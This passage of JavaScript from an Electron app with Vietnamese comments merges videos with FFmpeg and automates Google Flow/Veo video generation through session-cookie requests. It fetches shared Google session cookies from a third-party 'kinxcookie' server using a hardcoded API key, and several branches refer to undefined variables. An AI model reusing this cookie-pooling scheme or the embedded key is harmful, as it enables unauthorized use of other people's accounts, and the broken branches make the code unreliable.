        const safePath = p.replace(/\\/g, "/").replace(/'/g, "'\\''");
        return `file '${safePath}'`;
      })
      .join("\n");

    try {
      be.writeFileSync(listPath, fileContent);
    } catch (err) {
      return resolve({
        success: false,
        error: `Lỗi tạo file list: ${err.message}`,
      });
    }

    // Khởi tạo lệnh FFmpeg
    xt = jo();

    xt.input(listPath)
      .inputOptions(["-f", "concat", "-safe", "0"])
      .outputOptions("-c", "copy")
      .on("progress", (progress) => {
        if (win && !win.isDestroyed()) {
          win.webContents.send("merge-progress", progress);
        }
      })
      .on("error", (err) => {
        console.error("FFmpeg Merge Error:", err.message);
        xt = null;
        // Dọn dẹp file list tạm
        try {
          be.unlinkSync(listPath);
        } catch { }

        if (err.message.includes("SIGKILL")) {
          resolve({ success: false, error: "Hủy ghép" });
        } else {
          // Thông báo lỗi chi tiết tùy hệ điều hành
          const osMsg =
            process.platform === "win32"
              ? "Trên Windows, hãy chắc chắn bạn đã cài FFmpeg và thêm vào biến môi trường PATH."
              : "Lỗi FFmpeg (MacOS).";
          resolve({ success: false, error: `Lỗi: ${err.message}. ${osMsg}` });
        }
      })
      .on("end", () => {
        xt = null;
        // Dọn dẹp file list tạm
        try {
          be.unlinkSync(listPath);
        } catch { }
        resolve({ success: true, path: finalPath });
      })
      .save(finalPath);
  });
});
he.ipcMain.handle("stop-merge", async () => {
  if (xt)
    try {
      return (
        xt.kill("SIGKILL"),
        (xt = null),
        console.log("FFmpeg process stopped by user."),
        { success: !0 }
      );
    } catch (a) {
      return (
        console.error("Error stopping ffmpeg:", a),
        { success: !1, error: "Failed to stop process." }
      );
    }
  return { success: !1, error: "Không có quá trình ghép nào đang chạy." };
});
const bo = (a, i, c, h, f, t = "browser:log") => {
  const cacheBase64 = i && typeof i === "string" && i.includes("base64,") ? i.split("base64,")[1] : i;
  let detectedImgSize = null;
  try {
    if (cacheBase64 && typeof cacheBase64 === "string" && cacheBase64.length > 100) {
      const bBuf = Buffer.from(cacheBase64, "base64");
      const nImg = he.nativeImage.createFromBuffer(bBuf);
      if (!nImg.isEmpty()) detectedImgSize = nImg.getSize();
    }
  } catch (_) { }
  const cacheKey = f && cacheBase64 ? `${f}_${_r.createHash("md5").update(cacheBase64).digest("hex")}` : null;
  if (cacheKey && global.uploadedImageCache) {
    const cached = global.uploadedImageCache.get(cacheKey);
    if (cached) {
      if (detectedImgSize && typeof cached === "string") {
        if (!global.mediaImageSizeCache) global.mediaImageSizeCache = new Map();
        global.mediaImageSizeCache.set(String(cached).toLowerCase(), detectedImgSize);
        global.mediaImageSizeCache.set(String(cached), detectedImgSize);
      }
      return typeof cached === "string" ? Promise.resolve(cached) : cached;
    }
  }
  const uploadPromise = (async () => {
    if (
      (a &&
        !a.isDestroyed() &&
        a.webContents.send(t, {
          promptId: h,
          message: "Đang tải ảnh lên",
          status: "submitting",
        }),
        !i || typeof i != "string" || i.length < 100)
    )
      throw new Error("Dữ liệu ảnh (base64) không hợp lệ hoặc bị trống.");

    // --- SỬA LỖI 429 UPLOAD: NGHỈ VÀ THỬ LẠI NẾU BỊ RATE LIMIT ---
    let r;
    let uploadSuccess = false;
    let uploadAttempt = 0;
    const maxUploadAttempts = 3;

    while (!uploadSuccess && uploadAttempt < maxUploadAttempts) {
      if (isSessionStopped()) throw new Error("SESSION_STOPPED");
      uploadAttempt++;
      try {
        // Nghỉ một chút trước khi thử (tăng dần nếu là lần thử lại)
        await cancellableSleep(3000 + (uploadAttempt * 2000));
        if (isSessionStopped()) throw new Error("SESSION_STOPPED");

        r = await We(null, {
          // url: "https://aisandbox-pa.googleapis.com/v1/flow/uploadImage",
          url: "https://flow.google.com/v1/flow/uploadImage",
          cookie: c,
          options: {
            method: "POST",
            body: {
              imageBytes: i.includes("base64,") ? i.split("base64,")[1] : i,
              clientContext: {
                projectId: f, // Dùng f trực tiếp (projectId)
                tool: "PINHOLE"
              },
              mimeType: (i.match(/^data:(image\/\w+);base64,/) || [])[1] || "image/jpeg",
              fileName: `upload_${Date.now()}.${((i.match(/^data:image\/(\w+);/) || [])[1] || 'jpg')}`,
              isUserUploaded: true,
              isHidden: false,
            },
          },
        });

        const mId = r?.mediaId || r?.media?.name || r?.mediaGenerationId?.mediaGenerationId;
        if (mId) {
          uploadSuccess = true;
          r = mId; // Trả về mediaId
        } else {
          console.error("[Upload] Phản hồi lỗi:", JSON.stringify(r));
          throw new Error("Không lấy được mediaId từ phản hồi upload.");
        }
      } catch (err) {
        if (isSessionStopped() || String(err.message || "").includes("SESSION_STOPPED")) {
          throw new Error("SESSION_STOPPED");
        }
        if (err.message.includes("429") && uploadAttempt < maxUploadAttempts) {
          console.warn(`[Upload] Bị lỗi 429 Thao tác quá nhanh. Đang thử lại lần ${uploadAttempt + 1}...`);
          continue;
        }
        throw err;
      }
    }

    const l = r;
    if (!l)
      throw (
        (console.error(
          `[${h || "general"}] Failed to get mediaId from upload response:`,
          r
        ),
          new Error("Không thể lấy mediaId sau khi tải ảnh lên."))
      );

    if (detectedImgSize) {
      if (!global.mediaImageSizeCache) global.mediaImageSizeCache = new Map();
      global.mediaImageSizeCache.set(String(l).toLowerCase(), detectedImgSize);
      global.mediaImageSizeCache.set(String(l), detectedImgSize);
    }

    // --- NGHỈ THÊM 2 GIÂY SAU KHI UPLOAD XONG ĐỂ CHẮC CHẮN ---
    await cancellableSleep(2000);
    if (isSessionStopped()) throw new Error("SESSION_STOPPED");

    return (
      a &&
      !a.isDestroyed() &&
      !isSessionStopped() &&
      a.webContents.send(t, {
        promptId: h,
        message: "Tải ảnh lên thành công!",
        status: "submitting",
      }),
      l
    );
  })();
  if (cacheKey && global.uploadedImageCache) {
    global.uploadedImageCache.set(cacheKey, uploadPromise);
    uploadPromise.catch(() => {
      if (global.uploadedImageCache.get(cacheKey) === uploadPromise) global.uploadedImageCache.delete(cacheKey);
    });
  }
  return uploadPromise;
},
  zd = async (a, i, c, h, f, t) => {
    const r = (
      o,
      n,
      s,
      u = null,
      m = null,
      E = null,
      y = null,
      p = null,
      A = null
    ) => {
      a &&
        !a.isDestroyed() &&
        a.webContents.send("browser:log", {
          promptId: o,
          message: n,
          status: s,
          videoUrl: u,
          operationName: m,
          sceneId: E,
          mediaId: y,
          projectId: p,
          cookie: A,
        }),
        console.log(`[${o || "general"}] ${n}`);
    };
    let l = null,
      e = null;
    try {
      if (!i.startImageBase64) throw new Error("Cần có ảnh Bắt đầu.");
      if (!i.text || typeof i.text != "string" || i.text.trim() === "")
        throw new Error("Nội dung Prompt không được để trống.");
      const o = `;${Date.now()}`;
      (l = await bo(
        a,
        i.startImageBase64,
        h,
        i.id,
        c,
        "browser:log"
      )),
        i.endImageBase64 &&
        (e = await bo(
          a,
          i.endImageBase64,
          h,
          i.id,
          c,
          "browser:log"
        )),
        r(i.id, "Bắt đầu tạo video...", "submitting");
      const n = `client-generated-uuid-${Date.now()}-${Math.random()}`;
      let s,
        u,
        m,
        B = `batch-${Date.now()}-${Math.random()}`,
        E = {
          mediaGenerationContext: {
            batchId: B,
            audioFailurePreference: "BLOCK_SILENCED_VIDEOS",
          },
          clientContext: {
            projectId: c,
            tool: "IMAGE_FX",
            userPaygateTier: "PAYGATE_TIER_TWO",
          },
        };
      const isPortrait = f === "PORTRAIT" || f === "9:16";
      e
        ? ((s =
          /* "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoStartAndEndImage" */
          "https://flow.google.com/v1/video:batchAsyncGenerateVideoStartAndEndImage"),
          (u = flowFormatModelKey("veo_3_1_i2v_lite")),
          (m = {
            startImage: { mediaId: l },
            endImage: { mediaId: e },
            aspectRatio: `VIDEO_ASPECT_RATIO_${isPortrait
              ? "PORTRAIT"
              : f === "16:9"
                ? "LANDSCAPE"
                : f.toUpperCase()
              }`,
            seed: Math.floor(Math.random() * 1e5),
            textInput: { structuredPrompt: { parts: [{ text: i.text.trim() }] } },
            metadata: { sceneId: n },
            videoModelKey: u,
          }))
        : ((s =
          /* "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoStartImage" */
          "https://flow.google.com/v1/video:batchAsyncGenerateVideoStartImage"),
          (u = flowFormatModelKey("veo_3_1_i2v_lite")),
          (m = {
            startImage: { mediaId: l },
            aspectRatio: `VIDEO_ASPECT_RATIO_${isPortrait
              ? "PORTRAIT"
              : f === "16:9"
                ? "LANDSCAPE"
                : f.toUpperCase()
              }`,
            seed: Math.floor(Math.random() * 1e5),
            textInput: { structuredPrompt: { parts: [{ text: i.text.trim() }] } },
            metadata: { sceneId: n },
            videoModelKey: u,
          }));
      const p = await We(null, {
        url: s,
        cookie: h,
        options: {
          method: "POST",
          body: { ...E, requests: [m], useV2ModelConfig: true },
        },
      });
      const workflow = p?.workflows?.[0];
      const media = p?.media?.[0];
      const opName = media?.name || workflow?.name || p?.media?.[0]?.operation?.name;
      const sId = media?.sceneId || p?.media?.[0]?.sceneId || p?.sceneId || n;

      if (!opName || !sId)
        throw (
          (console.error(`[${i.id}] Invalid generate response:`, p),
            new Error("Không lấy được workflow name hoặc sceneId."))
        );
      A = { operation: { name: opName }, sceneId: sId };
      for (
        r(
          i.id,
          "Đang tạo video...",
          "processing",
          null,
          (A.operation?.name || A.name),
          A.sceneId,
          null,
          c,
          h
        );
        !$e && (await cancellableSleep(Zr), !$e);

      ) {
        r(i.id, "Đang kiểm tra trạng thái video...", "processing");
        const S = await We(null, {
          // url: "https://aisandbox-pa.googleapis.com/v1/video:batchCheckAsyncVideoGenerationStatus",
          url: "https://flow.google.com/v1/video:batchCheckAsyncVideoGenerationStatus",
          cookie: h,
          options: {
            method: "POST",
            body: { media: [{ name: (A.operation?.name || A.name), projectId: poolItem.projectId }] },
          },
        });
        if (!S || !Array.isArray(S.operations) || S.operations.length === 0)
          throw (
            (console.error(`[${i.id}] Invalid status response structure:`, S),
              new Error("Cấu trúc phản hồi trạng thái không hợp lệ."))
          );
        const opRes = S?.media?.[0] || S?.media?.[0] || S;
        const R = (opRes?.status || opRes?.mediaMetadata?.mediaStatus?.mediaGenerationStatus || opRes?.mediaStatus?.mediaGenerationStatus || "UNKNOWN_STATUS")
          .replace("MEDIA_GENERATION_STATUS_", "")
          .toLowerCase();
        if (
          (r(i.id, `Trạng thái: ${R}`, "processing"),
            (opRes?.status === "MEDIA_GENERATION_STATUS_SUCCESSFUL" || opRes?.mediaMetadata?.mediaStatus?.mediaGenerationStatus === "MEDIA_GENERATION_STATUS_SUCCESSFUL" || opRes?.mediaStatus?.mediaGenerationStatus === "MEDIA_GENERATION_STATUS_SUCCESSFUL"))
        ) {
          const C = opRes?.operation?.metadata?.video || opRes?.video || S?.video;
          if (!C || (!C.fifeUrl && !C.servingBaseUri && !C.generatedVideo?.fifeUrl))
            throw (
              (console.error(
                `[${i.id}] Success status but no video URL found:`,
                opRes
              ),
                new Error("Tạo thành công nhưng không tìm thấy URL video."))
            );
          let v = C.fifeUrl || C.servingBaseUri || C.generatedVideo?.fifeUrl || C.generatedVideo?.servingBaseUri,
            w = C.mediaGenerationId || C.generatedVideo?.mediaGenerationId || opRes?.name;
          if (!v) {
            try {
              let mId = "";
              if (typeof opRes !== 'undefined') mId = opRes.operation?.name || opRes.name;
              if (!mId && typeof S !== 'undefined') mId = S?.operation?.name || S?.name || (A.operation?.name || A.name);

              if (mId) {
                const fetchFn = global.fetch || require("node-fetch");
                let cVal = "";
                if (typeof h !== 'undefined') cVal = h;
                if (typeof cVal === "object") cVal = cVal.value;


                console.log("[Redirect Debug] Cookie length:", typeof cVal !== "undefined" && cVal ? cVal.length : 0);
                const redirectRes = await flowMediaRedirectResponse(mId, cVal);
                if (redirectRes.status === 302 || redirectRes.status === 301 || redirectRes.status === 307) {
                  v = redirectRes.headers.get("location");
                } else if (redirectRes.url && redirectRes.url.includes("googleusercontent")) {
                  v = redirectRes.url;
                } else {
                  try {
                    const cValStr = (typeof cVal === "object" && cVal) ? (cVal.value || "") : (cVal || "");
                    const signed = await fetchFlowMediaSignedUrl(mId, cValStr);
                    if (signed) { v = signed; console.log("[Redirect] as29s fallback lay URL:", signed); }
                  } catch (e) { console.error("[Redirect] fallback fail:", e.message); }
                }
              }
            } catch (e) {
              console.error("Lỗi Redirect API:", e);
            }
          }

          if (t.enabled && t.path && v) {
            await Ho(a, v, i.text, t.path, i.originalIndex, t, i.id);
          }
          r(
            i.id,
            "Hoàn thành!",
            "success",
            v,
            (A.operation?.name || A.name),
            A.sceneId,
            w,
            c,
            h
          );
          return;
        } else if (opRes?.status === "MEDIA_GENERATION_STATUS_FAILED" || opRes?.mediaMetadata?.mediaStatus?.mediaGenerationStatus === "MEDIA_GENERATION_STATUS_FAILED" || opRes?.mediaStatus?.mediaGenerationStatus === "MEDIA_GENERATION_STATUS_FAILED") {
          const detail = opRes?.error?.message || opRes?.mediaStatus?.statusDetail || "Không có chi tiết lỗi từ Google";
          console.error(`[${i.id}] Chi tiết lỗi FAILED (zd):`, JSON.stringify(opRes));
          throw new Error(`Lỗi Veo API (FAILED): ${detail}`);
        } else
          (b?.status === "MEDIA_GENERATION_STATUS_UNSPECIFIED" || !b?.status) &&
            console.warn(
              `[${i.id}] Trạng thái video không xác định từ API:`,
              b
            );
      }
      $e && r(i.id, "Đã dừng bởi người dùng", "idle");
    } catch (o) {
      let n = o.message;
      if (
        (n === "Nội dung Prompt không được để trống." ||
          n === "Cần có ảnh Bắt đầu."
          ? r(i.id, `Lỗi: ${n}`, "error")
          : o.message.includes("mediaId")
            ? r(i.id, `Lỗi tải ảnh lên: ${n}`, "error")
            : o.statusCode === 500
              ? ((n = `Lỗi máy chủ (${o.message}). Thử lại...`),
                r(i.id, `Lỗi: ${n}`, "error"))
              : r(i.id, `Lỗi: ${n}`, "error"),
          n !== "Nội dung Prompt không được để trống." &&
          n !== "Cần có ảnh Bắt đầu.")
      )
        throw o;
    }
  },
  Yd = async (a, i) => {
    try {
      const c = await fetch(a);
      if (!c.ok) throw new Error(`Failed to fetch video: ${c.statusText}`);
      const h = await c.arrayBuffer(),
        f = Buffer.from(h);
      return await be.promises.writeFile(i, f), i;
    } catch (c) {
      throw (
        (console.error(`Download to path error (${i}):`, c),
          new Error(`Lỗi tải file tạm: ${c.message}`))
      );
    }
  },
  Kd = (a, i) =>
    new Promise((c, h) => {
      jo(a)
        .inputOptions("-sseof", "-0.1")
        .outputOptions("-vframes", "1")
        .save(i)
        .on("end", () => {
          console.log(`Đã trích xuất frame cuối: ${i}`), c(i);
        })
        .on("error", (f) => {
          console.error("FFmpeg Lỗi trích xuất frame:", f),
            h(new Error(`FFmpeg Lỗi trích xuất frame: ${f.message}`));
        });
    }),
  Xd = async (a) => {
    try {
      return (await be.promises.readFile(a)).toString("base64");
    } catch (i) {
      throw (
        (console.error("Lỗi chuyển ảnh sang base64:", i),
          new Error(`Lỗi đọc file frame: ${i.message}`))
      );
    }
  },
  Jd = (a, i) =>
    new Promise((c, h) => {
      const f = ye.join(
        he.app.getPath("temp"),
        `extended-filelist-${Date.now()}.txt`
      ),
        t = a.map((r) => `file '${r.replace(/'/g, "'\\''")}'`).join(`
`);
      be.writeFileSync(f, t),
        console.log(`Đang ghép ${a.length} video vào ${i}`),
        jo()
          .input(f)
          .inputOptions(["-f", "concat", "-safe", "0"])
          .outputOptions("-c", "copy")
          .save(i)
          .on("end", () => {
            try {
              be.unlinkSync(f);
            } catch { }
            console.log("Ghép video thành công."), c(i);
          })
          .on("error", (r) => {
            try {
              be.unlinkSync(f);
            } catch { }
            console.error("Lỗi ghép video :", r),
              h(new Error(` Lỗi ghép video: ${r.message}`));
          });
    }),
  Qd = async (a, i, c, h, f, t) => {
    let r;
    try {
      if (!a.text || typeof a.text != "string" || a.text.trim() === "")
        throw new Error("Nội dung Prompt không được để trống.");
      try {
        const e = JSON.parse(a.text);
        if (
          ((r = e.prompt || e.text),
            !r || typeof r != "string" || r.trim() === "")
        )
          throw new Error(
            "Không tìm thấy trường 'prompt'/'text' hợp lệ trong JSON."
          );
        r = r.trim();
      } catch {
        r = a.text.trim();
      }
    } catch (e) {
      throw (t(a.id, `Lỗi: ${e.message}`, "error"), e);
    }
    const l = h;
    if (Qe) throw new Error("Đã dừng");
    try {
      t(a.id, "Đang tạo ...", "submitting");
      const e = `client-generated-uuid-${Date.now()}-${Math.random()}`,
        o = {
          clientContext: { projectId: i, tool: "IMAGE_FX" },
          requests: [
            {
              aspectRatio: `VIDEO_ASPECT_RATIO_${f.toUpperCase()}`,
              seed: Math.floor(Math.random() * 1e5),
              textInput: { structuredPrompt: { parts: [{ text: r }] } },
              videoModelKey:
                f === "PORTRAIT"
                  ? flowFormatModelKey("veo_3_1_t2v_lite")
                  : flowFormatModelKey("veo_3_1_t2v_lite"),
              metadata: { sceneId: e },
            },
          ],
        },
        s = (
          await We(null, {
            // url: "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoText",
            url: "https://flow.google.com/v1/video:batchAsyncGenerateVideoText",
            cookie: c,
            options: { method: "POST", body: o },
          })
        )?.media?.[0];
      if (!(s?.operation?.name || s?.name) || !s?.sceneId)
        throw new Error("Không lấy được operation/scene ID (T2V).");
      for (
        t(a.id, "Video đang được xử lý..", "processing");
        !Qe && (await cancellableSleep(Zr), !Qe);

      ) {
        t(a.id, "Đang kiểm tra ...", "processing");
        const m = (
          await We(null, {
            // url: "https://aisandbox-pa.googleapis.com/v1/video:batchCheckAsyncVideoGenerationStatus",
            url: "https://flow.google.com/v1/video:batchCheckAsyncVideoGenerationStatus",
            cookie: c,
            options: {
              method: "POST",
              body: { media: [{ name: (s.operation?.name || s.name), projectId: poolItem.projectId }] },
            },
          })
        )?.media?.[0];
        if (!m)
          throw new Error("Cấu trúc phản hồi trạng thái T2V không hợp lệ.");
        const E = (m?.status || "UNKNOWN_STATUS")
          .replace("MEDIA_GENERATION_STATUS_", "")
          .toLowerCase();
        if (m?.status === "MEDIA_GENERATION_STATUS_SUCCESSFUL" || m?.mediaStatus?.mediaGenerationStatus === "MEDIA_GENERATION_STATUS_SUCCESSFUL") {
          const y = m?.operation?.metadata?.video || m?.video || S?.video;
          let p = y?.fifeUrl || y?.servingBaseUri || y?.generatedVideo?.fifeUrl || y?.generatedVideo?.servingBaseUri;
          if (!p) {
            try {
              // Dynamically get mediaId from available variables (S, m, checkRes, etc)
              let mId = "";
              if (typeof opStatus !== 'undefined') mId = opStatus.operation?.name || opStatus.name;
              if (!mId && typeof checkRes !== 'undefined') mId = checkRes?.media?.[0]?.name;
              if (!mId && typeof S !== 'undefined') mId = S?.operation?.name || S?.name;
              if (!mId && typeof m !== 'undefined') mId = m?.operation?.name || m?.name;

              if (mId) {
                const fetchFn = global.fetch || require("node-fetch");
                // Find available cookie variable
                let cVal = "";
                if (typeof poolItem !== 'undefined' && poolItem && poolItem.cookie) cVal = poolItem.cookie;
                else if (typeof cookie !== 'undefined') cVal = cookie;
                else if (typeof c !== 'undefined') cVal = c;
                else if (typeof h !== 'undefined') cVal = h;

                if (typeof cVal === "object") cVal = cVal.value;


                console.log("[Redirect Debug] Cookie length:", typeof cVal !== "undefined" && cVal ? cVal.length : 0);
                const redirectRes = await flowMediaRedirectResponse(mId, cVal);
                if (redirectRes.status === 302 || redirectRes.status === 301 || redirectRes.status === 307) {
                  p = redirectRes.headers.get("location");
                } else if (redirectRes.url && redirectRes.url.includes("googleusercontent")) {
                  p = redirectRes.url;
                } else {
                  try {
                    const cValStr = (typeof cVal === "object" && cVal) ? (cVal.value || "") : (cVal || "");
                    const signed = await fetchFlowMediaSignedUrl(mId, cValStr);
                    if (signed) { p = signed; console.log("[Redirect] as29s fallback lay URL:", signed); }
                  } catch (e) { console.error("[Redirect] fallback fail:", e.message); }
                }
              }
            } catch (e) {
              console.error("Lỗi Redirect API:", e);
            }
          }

          const A = y?.mediaGenerationId || y?.generatedVideo?.mediaGenerationId || m?.name;
          if (!p || !A)
            throw new Error(
              "Tạo T2V thành công nhưng không tìm thấy URL/MediaId."
            );
          return (
            t(a.id, "T2V Thành công!", "processing"),
            { videoUrl: p, mediaId: A }
          );
        } else if (m?.status === "MEDIA_GENERATION_STATUS_FAILED") {
          const y = m?.error?.message || "Lỗi T2V không xác định từ Veo.";
          throw new Error(y);
        } else t(a.id, `Trạng thái : ${E}`, "processing");
      }
      if (Qe) throw new Error("Đã dừng");
    } catch (e) {
      throw (t(a.id, `Không tạo được: ${e.message}`, "error"), e);
    }
    throw new Error("Lỗi T2V không xác định.");
  },
  _l = async (a, i, c, h, f, t) => {
    let r;
    try {
      if (!a.text || typeof a.text != "string" || a.text.trim() === "")
        throw new Error("Nội dung Prompt không được để trống.");
      if (!h) throw new Error("Không có ảnh đầu vào cho Video.");
      try {
        const l = JSON.parse(a.text);
        if (
          ((r = l.prompt || l.text),
            !r || typeof r != "string" || r.trim() === "")
        )
          throw new Error(
            "Không tìm thấy trường 'prompt'/'text' hợp lệ trong JSON."
          );
        r = r.trim();
      } catch {
        r = a.text.trim();
      }
    } catch (l) {
      throw (t(a.id, `Lỗi: ${l.message}`, "error"), l);
    }
    if (Qe) throw new Error("Đã dừng");
    try {
      t(a.id, "Đang tải ảnh...", "submitting");
      const l = `session-${Date.now()}`,
        e = await bo(qe, h, c, a.id, i, "extended-video:log");
      t(a.id, "Đang tạo Video...", "submitting");
      const o = `client-generated-uuid-${Date.now()}-${Math.random()}`;
      const n =
        // "https://aisandbox-pa.googleapis.com/v1/video:batchAsyncGenerateVideoStartImage",
        "https://flow.google.com/v1/video:batchAsyncGenerateVideoStartImage",
        isPortrait = f === "PORTRAIT" || f === "9:16",
        s = flowFormatModelKey("veo_3_1_i2v_lite"),
        u = {
          startImage: { mediaId: e },
          aspectRatio: `VIDEO_ASPECT_RATIO_${isPortrait
            ? "PORTRAIT"
            : f === "16:9"
              ? "LANDSCAPE"
              : f.toUpperCase()
            }`,
          seed: Math.floor(Math.random() * 1e5),
          textInput: { structuredPrompt: { parts: [{ text: r }] } },
          metadata: { sceneId: o },
          videoModelKey: s,
        },
        p = (
          await We(null, {
            url: n,
            cookie: c,
            options: {
              method: "POST",
              body: {
                clientContext: {
                  projectId: i,
                  tool: "IMAGE_FX",
                  userPaygateTier: "PAYGATE_TIER_TWO",
                },
                requests: [u],
              },
            },
          })
        )?.media?.[0];
      if (!(p?.operation?.name || p?.name) || !p?.sceneId)
        throw new Error("Không lấy được operation/scene ID (I2V).");
      for (
        t(a.id, "Video đang được xử lý..", "processing");
        !Qe && (await cancellableSleep(Zr), !Qe);

      ) {
        t(a.id, "Đang kiểm tra Video...", "processing");
        const S = (
          await We(null, {
            // url: "https://aisandbox-pa.googleapis.com/v1/video:batchCheckAsyncVideoGenerationStatus",
            url: "https://flow.google.com/v1/video:batchCheckAsyncVideoGenerationStatus",
            cookie: c,
            options: {
              method: "POST",
              body: { media: [{ name: (p.operation?.name || p.name), projectId: poolItem.projectId }] },
            },
          })
        )?.media?.[0];
        if (!S)
          throw new Error("Cấu trúc phản hồi trạng thái I2V không hợp lệ.");
        const b = (S?.status || "UNKNOWN_STATUS")
          .replace("MEDIA_GENERATION_STATUS_", "")
          .toLowerCase();
        if (S?.status === "MEDIA_GENERATION_STATUS_SUCCESSFUL" || S?.mediaStatus?.mediaGenerationStatus === "MEDIA_GENERATION_STATUS_SUCCESSFUL") {
          const R = S?.operation?.metadata?.video || S?.video || S;
          let C = R?.fifeUrl || R?.servingBaseUri || R?.generatedVideo?.fifeUrl || R?.generatedVideo?.servingBaseUri;
          if (!C) {
            try {
              // Dynamically get mediaId from available variables (S, m, checkRes, etc)
              let mId = "";
              if (typeof opStatus !== 'undefined') mId = opStatus.operation?.name || opStatus.name;
              if (!mId && typeof checkRes !== 'undefined') mId = checkRes?.media?.[0]?.name;
              if (!mId && typeof S !== 'undefined') mId = S?.operation?.name || S?.name;
              if (!mId && typeof m !== 'undefined') mId = m?.operation?.name || m?.name;

              if (mId) {
                const fetchFn = global.fetch || require("node-fetch");
                // Find available cookie variable
                let cVal = "";
                if (typeof poolItem !== 'undefined' && poolItem && poolItem.cookie) cVal = poolItem.cookie;
                else if (typeof cookie !== 'undefined') cVal = cookie;
                else if (typeof c !== 'undefined') cVal = c;
                else if (typeof h !== 'undefined') cVal = h;

                if (typeof cVal === "object") cVal = cVal.value;


                console.log("[Redirect Debug] Cookie length:", typeof cVal !== "undefined" && cVal ? cVal.length : 0);
                const redirectRes = await flowMediaRedirectResponse(mId, cVal);
                if (redirectRes.status === 302 || redirectRes.status === 301 || redirectRes.status === 307) {
                  C = redirectRes.headers.get("location");
                } else if (redirectRes.url && redirectRes.url.includes("googleusercontent")) {
                  C = redirectRes.url;
                } else {
                  try {
                    const cValStr = (typeof cVal === "object" && cVal) ? (cVal.value || "") : (cVal || "");
                    const signed = await fetchFlowMediaSignedUrl(mId, cValStr);
                    if (signed) { C = signed; console.log("[Redirect] as29s fallback lay URL:", signed); }
                  } catch (e) { console.error("[Redirect] fallback fail:", e.message); }
                }
              }
            } catch (e) {
              console.error("Lỗi Redirect API:", e);
            }
          }

          const v = R?.mediaGenerationId || R?.generatedVideo?.mediaGenerationId || S?.name;
          if (!C || !v)
            throw new Error(
              "Tạo Video thành công nhưng không tìm thấy URL/MediaId."
            );
          return (
            t(a.id, "Tạo video Thành công!", "processing"),
            { videoUrl: C, mediaId: v }
          );
        } else if (S?.status === "MEDIA_GENERATION_STATUS_FAILED") {
          const R = S?.error?.message || "Lỗi I2V không xác định từ Veo.";
          throw new Error(R);
        } else t(a.id, `Trạng thái Video : ${b}`, "processing");
      }
      if (Qe) throw new Error("Đã dừng");
    } catch (l) {
      throw (t(a.id, `Lỗi Khi tạo: ${l.message}`, "error"), l);
    }
    throw new Error("Lỗi không xác định.");
  }; // Đảm bảo biến cache toàn cục đã tồn tại (nếu chưa khai báo ở trên)
global.veoCookieCache = global.veoCookieCache || [];

// --- BẮT ĐẦU CODE SỬA: LOGIC LẤY COOKIE "BẤT TỬ" (Lặp Server <-> Local) ---
// --- BẮT ĐẦU CODE SỬA: NẠP DANH SÁCH COOKIE CÁ NHÂN ---
he.ipcMain.on(
  "video:create-from-frames",
  async (
    a,
    {
      prompts: i,
      concurrentStreams: r,
      activeCookie: ac,
      localCookies: lc,
      aspectRatio: h,
      autoSaveConfig: f,
      authToken: c,
      currentUser: u,
    }
  ) => {
    const l = he.BrowserWindow.fromWebContents(a.sender);
    if (!l) return;

    if (
      !u ||
      !u.subscription ||
      new Date(u.subscription.end_date) < new Date()
    ) {
      const msg = u?.subscription
        ? "Gói đăng ký đã hết hạn."
        : "Bạn cần nâng cấp gói.";
      he.dialog.showMessageBox(l, {
        type: "warning",
        title: "Yêu Cầu Nâng Cấp",
        message: msg,
      });
      l.webContents.send("navigate-to-view", "packages");
      return;
    }
    const restrictedPackage = "Gói Cá Nhân/1 Máy";
    if (u.subscription.package_name === restrictedPackage) {
      he.dialog.showMessageBox(l, {
        type: "info",
        title: "Tính Năng Pro",
        message:
          "Chức năng 'Tạo Video Đồng Nhất' chỉ dành cho gói Pro, Team hoặc Enterprise. Vui lòng nâng cấp để sử dụng.",
      });
      l.webContents.send("navigate-to-view", "packages");
      return;
    }

    $e = !1;
    newSessionAbortController();
    // ===== [BUGFIX-404] Xóa cache session cũ khi bắt đầu chạy =====
    if (global.bananaFrontendUploadCache) global.bananaFrontendUploadCache.clear();
    threadTokenCache.clear();
    console.log("[BUGFIX-404] Đã xóa cache session cũ (uploadedImageCache, bananaFrontendUploadCache, threadTokenCache).");
    // =============================================================
    const COOKIE_TTL = 60 * 60 * 1000;
    // [FIX] Cookie local đã dùng -> không xoay lại vô hạn 2 cookie
    let localConsumed = new Set();

    const s = (
      E,
      y,
      p,
      A = null,
      S = null,
      b = null,
      R = null,
      C = null,
      v = null
    ) => {
      if (($e || Qe) && p !== "idle" && p !== "finished") return;
      if (l && !l.isDestroyed()) {
        l.webContents.send("browser:log", {
          promptId: E,
          message: y,
          status: p,
          videoUrl: A,
          operationName: S,
          sceneId: b,
          mediaId: R,
          projectId: C,
          cookie: v,
        });
      }
      // console.log(`[FrameGen] [${E || "System"}] ${y}`);
    };

    const fetchNewCookieFromServer = async (reason = "") => {
      const serverToken = c || u?.token || u?.authToken || u?.access_token;
      if (!serverToken) throw new Error("Thiếu authToken để lấy cookie từ kinxcookie");

      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 15000);
      try {
        const response = await fetch(kinxCookieUrl(reason), {
          headers: {
            "X-API-Key": "kinx@0$*2048",
            Authorization: serverToken.startsWith("Bearer ") ? serverToken : `Bearer ${serverToken}`,
          },
          signal: controller.signal,
        });
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const res = await response.json();
        if (res.success && res.cookie) return res.cookie;
        throw new Error(res.message || "Server không trả về cookie hợp lệ.");
      } catch (err) {
        if (err.name === "AbortError") {
          throw new Error("Timeout lấy cookie từ kinxcookie sau 15 giây");
        }
        throw new Error(`Lỗi lấy cookie: ${err.message}`);
      } finally {
        clearTimeout(timeout);
      }
    };

    const initProjectForCookie = async (cookie, index) => {
      // Tạo project qua flow.google.com batchexecute (jHPbke) + lấy UUID (UpteDb),
      // cookie dùng chung từ kinxcookie.php (thay cho labs project.createProject).
      try {
        const serverToken = c || u?.token || u?.authToken || u?.access_token;
        const projectId = await flowCreateProject(serverToken, flowDefaultProjectTitle(), cookie);
        console.log(`[Init] Tạo project qua Flow RPC thành công: ${projectId}`);
        return projectId;
      } catch (err) {
        throw new Error(`Không tạo được projectId thật: ${err.message}`);
      }
    };

    const prepareCookiePool = async () => {
      global.veoCookieCache = [];
      const requiredCookies = 1;
      const maxServerAttempts = 3;

      // A. Ưu tiên Cookie từ Server
      for (let attempt = 1; attempt <= maxServerAttempts && !$e; attempt++) {
